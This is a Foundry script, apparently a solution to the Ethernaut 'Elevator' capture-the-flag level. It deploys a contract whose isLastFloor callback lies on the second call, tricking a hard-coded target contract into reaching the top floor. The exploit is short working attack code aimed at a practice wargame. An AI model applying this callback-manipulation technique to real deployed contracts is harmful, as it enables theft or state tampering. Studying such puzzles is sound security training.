// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Building2 {

    Elevator elevator = Elevator(0xB2D023AbDD8551cfe3D147e3Dc1532Ab9841D895);
    uint256 called;
    function isLastFloor(uint256 _floor) external returns(bool) {
        called += 1;
        if (called == 1) {
            return false;
        } else {
            return true;
        }
    }

    function goTo() external {
        elevator.goTo(1);
    }
}

contract ElevatorSolution is Script {


    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Building2 building = new Building2();
        building.goTo();
        vm.stopBroadcast();
    }
}